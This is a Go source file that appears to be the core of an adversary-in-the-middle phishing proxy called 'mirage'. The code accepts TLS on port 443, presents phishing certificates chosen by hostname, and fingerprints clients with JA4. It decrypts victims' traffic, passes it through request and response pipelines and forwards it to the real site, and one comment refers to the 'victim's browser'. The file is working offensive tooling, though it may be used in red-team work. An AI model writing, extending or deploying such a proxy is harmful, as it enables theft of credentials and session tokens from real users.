package proxy

import (
	"bufio"
	"context"
	"crypto/rand"
	"crypto/tls"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	"log/slog"
	"net"
	"net/http"
	"strings"
	"time"

	"github.com/travisbale/mirage/internal/aitm"
)

// AiTMProxy is a reverse-proxy HTTPS server.
// It accepts raw TCP connections on port 443, peeks at the TLS ClientHello
// to capture bytes for JA4 fingerprinting, completes the TLS handshake using
// the SNI hostname to select the right certificate, then routes all decrypted
// HTTP traffic through the configured Pipeline.
type AiTMProxy struct {
	certSource aitm.CertSource
	pipeline   *Pipeline
	wsHub      *WSHub
	spoof      *ProxySpoofProxy
	logger     *slog.Logger
}

// NewAiTMProxy constructs a AiTMProxy. Call Start() to begin accepting connections.
func NewAiTMProxy(
	certSource aitm.CertSource,
	pipeline *Pipeline,
	wsHub *WSHub,
	spoof *ProxySpoofProxy,
	logger *slog.Logger,
) *AiTMProxy {
	return &AiTMProxy{
		certSource: certSource,
		pipeline:   pipeline,
		wsHub:      wsHub,
		spoof:      spoof,
		logger:     logger,
	}
}

// Start begins listening on addr (e.g. ":443") and blocks until ctx is cancelled.
func (p *AiTMProxy) Start(ctx context.Context, addr string) error {
	listener, err := net.Listen("tcp", addr)
	if err != nil {
		return fmt.Errorf("mitm: listen %s: %w", addr, err)
	}
	p.logger.Info("mitm proxy started", "addr", addr)

	// Close the listener when ctx is cancelled so Accept unblocks.
	go func() {
		<-ctx.Done()
		listener.Close()
	}()

	for {
		conn, err := listener.Accept()
		if err != nil {
			select {
			case <-ctx.Done():
				return nil
			default:
				return fmt.Errorf("mitm: accept: %w", err)
			}
		}
		go p.handleConn(conn)
	}
}

// handleConn is the per-connection goroutine.
// Flow:
//  1. Wrap in PeekedConn to capture raw ClientHello bytes for JA4.
//  2. Complete TLS handshake — GetCertificate uses the SNI hostname from the
//     ClientHello to select the right phishing certificate.
//  3. Allocate a ProxyContext for this connection.
//  4. Serve HTTP/1.1 over the decrypted connection via serveDecrypted().
func (p *AiTMProxy) handleConn(rawConn net.Conn) {
	defer rawConn.Close()

	// Wrap in PeekedConn to tee the first TLS record before the handshake
	// consumes it. This gives us the raw ClientHello bytes for JA4 computation.
	peeked := NewPeekedConn(rawConn)

	// Complete the TLS handshake. crypto/tls calls GetCertificate with the
	// SNI hostname from the ClientHello, so we present the right cert per host.
	tlsConfig := &tls.Config{
		GetCertificate: p.certSource.GetCertificate,
	}
	tlsConn := tls.Server(peeked, tlsConfig)
	if err := tlsConn.Handshake(); err != nil {
		p.logger.Debug("mitm: TLS handshake failed", "error", err)
		return
	}
	defer tlsConn.Close()

	// Allocate a ProxyContext for this connection.
	pctx := &aitm.ProxyContext{
		RequestID:        newRequestID(),
		ClientHelloBytes: peeked.ClientHelloBytes(),
	}

	p.serveDecrypted(pctx, tlsConn)
}

// serveDecrypted reads HTTP requests from the decrypted connection, runs the
// request pipeline, forwards to upstream if not short-circuited, runs the
// response pipeline, and writes the response back.
func (p *AiTMProxy) serveDecrypted(pctx *aitm.ProxyContext, conn net.Conn) {
	connReader := bufio.NewReader(conn)

	for {
		req, err := http.ReadRequest(connReader)
		if err != nil {
			if !errors.Is(err, io.EOF) && !isConnReset(err) {
				p.logger.Debug("mitm: reading request", "error", err)
			}
			return
		}
		req.URL.Scheme = "https"

		// Check for WebSocket upgrade to the hub endpoint.
		if isWebSocketUpgrade(req) && strings.HasPrefix(req.URL.Path, "/ws/") {
			sessionID := strings.TrimPrefix(req.URL.Path, "/ws/")
			rec := newHijackableResponseWriter(conn)
			pctx.ResponseWriter = rec
			p.wsHub.HandleUpgrade(rec, req, sessionID)
			return
		}

		// Wrap conn as a ResponseWriter so short-circuiting handlers can respond.
		rec := newBufferedResponseWriter(conn)
		pctx.ResponseWriter = rec

		// Run the request pipeline.
		if err := p.pipeline.RunRequest(pctx, req); err != nil {
			if errors.Is(err, ErrShortCircuit) {
				rec.flush()
				if !rec.keepAlive {
					return
				}
				continue
			}
			p.logger.Error("mitm: request pipeline", "error", err)
			rec.writeError(http.StatusBadGateway, "bad gateway")
			return
		}

		// Forward to upstream.
		resp, err := p.forwardRequest(req)
		if err != nil {
			p.logger.Error("mitm: forwarding request", "error", err)
			rec.writeError(http.StatusBadGateway, "bad gateway")
			continue
		}

		// Run the response pipeline.
		if err := p.pipeline.RunResponse(pctx, resp); err != nil && !errors.Is(err, ErrShortCircuit) {
			p.logger.Error("mitm: response pipeline", "error", err)
		}

		// Write response back to client.
		if err := resp.Write(conn); err != nil {
			p.logger.Debug("mitm: writing response", "error", err)
			return
		}
		resp.Body.Close()

		if req.Close || resp.Close {
			return
		}
	}
}

// forwardRequest sends req to the upstream origin and returns the response.
func (p *AiTMProxy) forwardRequest(req *http.Request) (*http.Response, error) {
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: false},
		DialContext: (&net.Dialer{
			Timeout:   30 * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
		ResponseHeaderTimeout: 30 * time.Second,
	}
	client := &http.Client{
		Transport: transport,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse // don't follow redirects; let victim's browser do it
		},
	}

	// Clone the request for the upstream.
	upstreamReq := req.Clone(req.Context())
	upstreamReq.RequestURI = ""
	if upstreamReq.URL.Host == "" {
		upstreamReq.URL.Host = req.Host
	}

	resp, err := client.Do(upstreamReq)
	if err != nil {
		return nil, fmt.Errorf("upstream request: %w", err)
	}
	// Tag the response with the original request for sub-filter hostname matching.
	resp.Request = req
	return resp, nil
}

func isWebSocketUpgrade(req *http.Request) bool {
	return strings.EqualFold(req.Header.Get("Upgrade"), "websocket") &&
		strings.Contains(strings.ToLower(req.Header.Get("Connection")), "upgrade")
}

func isConnReset(err error) bool {
	return strings.Contains(err.Error(), "connection reset")
}

func newRequestID() string {
	buf := make([]byte, 8)
	rand.Read(buf)
	return hex.EncodeToString(buf)
}

// bufferedResponseWriter is a minimal http.ResponseWriter that writes to a net.Conn.
type bufferedResponseWriter struct {
	conn      net.Conn
	header    http.Header
	code      int
	buf       []byte
	keepAlive bool
}

func newBufferedResponseWriter(conn net.Conn) *bufferedResponseWriter {
	return &bufferedResponseWriter{
		conn:   conn,
		header: make(http.Header),
		code:   http.StatusOK,
	}
}

func (w *bufferedResponseWriter) Header() http.Header        { return w.header }
func (w *bufferedResponseWriter) WriteHeader(code int)       { w.code = code }
func (w *bufferedResponseWriter) Write(b []byte) (int, error) {
	w.buf = append(w.buf, b...)
	return len(b), nil
}

func (w *bufferedResponseWriter) flush() {
	resp := &http.Response{
		StatusCode: w.code,
		Header:     w.header,
		Proto:      "HTTP/1.1",
		ProtoMajor: 1,
		ProtoMinor: 1,
		Body:       io.NopCloser(strings.NewReader(string(w.buf))),
	}
	resp.ContentLength = int64(len(w.buf))
	resp.Write(w.conn)
}

func (w *bufferedResponseWriter) writeError(code int, msg string) {
	w.code = code
	w.buf = []byte(msg)
	w.flush()
}

// hijackableResponseWriter wraps a net.Conn and satisfies http.Hijacker for WebSocket upgrades.
type hijackableResponseWriter struct {
	conn   net.Conn
	header http.Header
	code   int
}

func newHijackableResponseWriter(conn net.Conn) *hijackableResponseWriter {
	return &hijackableResponseWriter{conn: conn, header: make(http.Header), code: http.StatusOK}
}

func (w *hijackableResponseWriter) Header() http.Header        { return w.header }
func (w *hijackableResponseWriter) WriteHeader(code int)       { w.code = code }
func (w *hijackableResponseWriter) Write(b []byte) (int, error) { return w.conn.Write(b) }
func (w *hijackableResponseWriter) Hijack() (net.Conn, *bufio.ReadWriter, error) {
	brw := bufio.NewReadWriter(bufio.NewReader(w.conn), bufio.NewWriter(w.conn))
	return w.conn, brw, nil
}
